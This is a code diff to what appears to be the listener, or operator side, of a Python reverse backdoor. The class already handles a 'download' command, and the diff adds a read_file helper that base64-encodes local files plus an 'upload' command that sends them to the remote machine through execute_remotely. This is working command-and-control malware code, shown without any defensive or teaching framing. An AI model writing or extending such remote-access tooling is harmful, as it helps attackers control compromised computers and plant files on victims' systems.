@@ -106,6 +106,16 @@ class Listener:
             file.write(base64.b64decode(content))
             return "[+] Download successful."
 
+    def read_file(self, path):
+        """
+        Read a file from the path
+        :param path: the path that contains the file we wanted to read
+        :type path: str
+        """
+        with open(path, "rb") as file:
+            # convert unknown characters to known characters
+            return base64.b64encode(file.read())
+
     def run(self):
         """
         Run the listener.
@@ -117,6 +127,11 @@ class Listener:
 
             if command[0] == "download":
                 result = self.write_file(command[1], result)
+
+            elif command[0] == "upload":
+                file_content = self.read_file(command[1])
+                command.append(file_content)
+                result = self.execute_remotely(command)
 
             print(result)
 
